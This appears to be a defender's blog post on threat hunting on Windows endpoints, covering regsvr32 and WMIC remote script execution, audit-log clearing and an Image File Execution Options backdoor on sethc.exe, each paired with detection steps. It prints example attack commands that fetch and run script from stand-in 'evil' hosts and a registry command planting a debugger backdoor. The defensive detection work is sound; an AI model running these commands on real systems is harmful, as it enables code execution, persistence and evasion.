---
layout: post
classes: wide
title:  "Threat Hunting in Windows Endpoints"
date:   2024-12-08 01:00:00 +0800
--- 
This post provides details on threat hunting in the machines running in Windows operating system.  

 
### Introduction
Threat hunting in a Windows environment involves the proactive search for indicators of compromise (IOCs) and other malicious artefacts to detect threats. I have listed some of the hunting techniques in the Windows environment.

### **<u>Application Whitelisting Bypass: regsvr32.exe</u>**

In computing, regsvr32 (Microsoft Register Server) is a command-line utility in Microsoft Windows operating systems for registering and unregistering DLLs and ActiveX controls in the Windows Registry. Adversaries can still use Regsvr32.exe on Windows to download and execute files

`regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll`

`regsvr32` is invoking scrobj.dll to unregister COM objects defined in the evil.sct. Malicious code will be used in the sct file.
The SCT file ( an XML file) has a registration tag in it that can contain VBScript or JScript code.  The file can have any extension.It doesn’t have to be `.sct`. There will be no artifacts left in registry if this utility is unregistering any COM object.

<u>Detection:</u>
- Look for regsvr32.exe prefetch files and Parsing the prefetch will provide the executed file. 
- Command execution and arguments passed to regsvr32.exe using EDR solutions.
- Look for suspicious process in the system with parent process as regsvr32.
- Hunt for Windows event id 4688 and filter the command arguments with following filter
`regSvr32 /s /n /u /i:http`

Note: This utility invokes default HTTP useragent based on your system settings.
Mozilla/4.0 (compatible; MSIE X.0; Windows NT 6.2; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C)

Note: Auditing policy for process tracking have to be enabled to trigger 4688 event id and in Advanced Audit Configuration ,
Detailed Tracking have to be enabled for recording process command arguments.

### **<u>Audit log cleared</u>**

Adversaries may clear the Windows audit logs to remove its footpath. Whenver audit logs are cleared , Windows triggers event id 104 or 1102 or 517.Look for these event ids in the machine and start your analysis.

<u>Detection:</u>
- Look for Event IDs 104,1102,517

### **<u>Bypass Authentication</u>**

Image File Execution Options (IFEO) are used for debugging and IFEO settings are stored in the Windows registry. This feature enables the developer to to attach a debugger to the known executables. Malwares exploit this feature for its persistence by adding a debugger to the below executables. whenever the below utilities are triggered, malcious executable will be executed.

`Windows Utilities`:
sethc.exe
magnify.exe
narrator.exe
osk.exe
utilman.exe
displayswitch.exe

`REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d "C:/evil.exe"`

<u>Detection:</u>
  Sweep all the executables under below mentioned registry path  "Image File Execution Options" and look for "debugger" key name.
  
Registry Path:
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe

### **<u>Bypass Proxy using WMIC</u>**

WMIC shell is a windows utility that provide command line interface for WMI(Windows Management Instrumentation).This offers various administrative functions to query windows machines to get details such as system settings, process and also to execute scripts. Adversaries use this utility to download malicious payload to evade detections.

`wmic os get /FORMAT:"http://evil/evil[.]xsl"`
XSL script (eXtensible Stylesheet Language). WMI can invoke javascript or VBscript using XSL

<u>Detection:</u>
- WMIC.exe prefetch files and Parsing the prefetch will provide the downloaded file. 
- Command execution and arguments passed to wmic.exe using EDR solutions.
- Look for Windows event id 4688 and search the process command arguments with this utility names as a keyword along with below syntax 
`wmic os get /FORMAT:"http:/"`
- Look for http request for file/page ending with XSL from proxy log or Network recorder.